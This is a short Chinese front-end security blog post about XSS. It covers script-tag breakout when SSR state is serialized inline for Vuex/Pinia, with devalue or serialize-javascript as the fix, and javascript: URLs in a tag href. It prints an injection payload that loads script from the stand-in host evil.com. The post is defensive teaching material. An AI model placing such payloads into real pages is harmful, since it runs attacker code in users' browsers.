---
title: 前端安全之XSS攻击的各种手段
tags:
  - 前端安全
categories:
  - 前端
  - 浏览器
date: 2023-02-06 11:30:47
---

# 在 SSR 场景下使用 Vuex 以及 Pinia 初始化状态存在的 XSS 风险

在 SSR 应用中，服务器预取数后，会将预取的数据暴露到全局对象中，以提供给 Vuex 或者是 Pinia 进行初始化调用。

此时，如果服务端预取的数据包含 XSS 攻击内容，则客户端将很容易收到攻击，比如在 SSR 服务中对返回给客户端的 HTML 拼接如下内容：

```js
const state = {
  userinput: `</script><script src='https://evil.com/mwahaha.js'>`
};

const template = `
<script>
  // NEVER DO THIS
  var preloaded = ${JSON.stringify(state)};
</script>`;
```

在客户端获取的 HTML 中将会包含：

```html
<script>
  // NEVER DO THIS
  var preloaded = {"userinput":"</script><script src='https://evil.com/mwahaha.js'>"};
</script>
```

这样就成功的向客户端加载了 `https://evil.com/mwahaha.js` 的内容。

为了避免此类情况的发生，可以使用 [@nuxt/devalue](https://github.com/nuxt-contrib/devalue) 或者 [serialize-javascript](https://www.npmjs.com/package/serialize-javascript) 解决。

# a 标签的 XSS 攻击

后台可以对某张卡片添加链接，前端将链接绑定在 a 标签的 href 上，但是 a 标签的 href 是可以执行 JavaScript 语句的：

```html
<a href="JavaScript:;"></a>
```

参考：https://security.stackexchange.com/questions/11985/will-javascript-be-executed-which-is-in-an-href